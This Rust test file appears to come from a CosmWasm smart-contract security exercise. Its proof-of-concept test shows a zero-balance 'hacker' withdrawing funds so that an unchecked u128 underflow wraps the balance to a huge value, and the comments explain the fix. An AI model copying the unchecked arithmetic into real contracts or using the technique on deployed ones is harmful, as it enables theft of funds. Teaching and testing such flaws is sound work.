#[test]
fn exploit() {
    // hint: use `cargo test --release` instead of `cargo test`
    let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

    let msg = InstantiateMsg {};
    let info = mock_info("creator", &coins(1000, "uosmo".to_string()));
    let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

    // check hacker balance, should be zero
    let res = query(
        deps.as_ref(),
        mock_env(),
        QueryMsg::GetBalance {
            address: "hacker".to_string(),
        },
    )
    .unwrap();
    let value: BalanceResponse = from_binary(&res).unwrap();
    assert_eq!(Uint128::from(0_u64), value.amount.amount);

    /*
    Since user's balance is using Rust's built-in u128 integer type, overflows are possible if overflow-checks is not enabled during profile release.
    Rust will prevent overflow issues to occur in debug mode, to replicate release mode scenario, use `cargo test --release`

    This issue can be easily prevented by using CosmWasm Uint128 to handle arithmetic operations, as overflows are checked by default
    https://docs.rs/cosmwasm-std/latest/src/cosmwasm_std/math/uint128.rs.html#322

    More resources on why this happens
    https://medium.com/coinmonks/understanding-arithmetic-overflow-underflows-in-rust-and-solana-smart-contracts-9f3c9802dc45
    https://doc.rust-lang.org/book/ch03-02-data-types.html#integer-overflow
    https://stackoverflow.com/a/70776258
        */

    // withdraw funds with 0 balance
    let info = mock_info("hacker", &[]);
    let msg = ExecuteMsg::Withdraw { amount: 1000_u128 };
    let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();

    // verify hack succeeded
    let res = query(
        deps.as_ref(),
        mock_env(),
        QueryMsg::GetBalance {
            address: "hacker".to_string(),
        },
    )
    .unwrap();
    let value: BalanceResponse = from_binary(&res).unwrap();
    assert_eq!(
        Uint128::from(340282366920938463463374607431768210456_u128),
        value.amount.amount
    );
}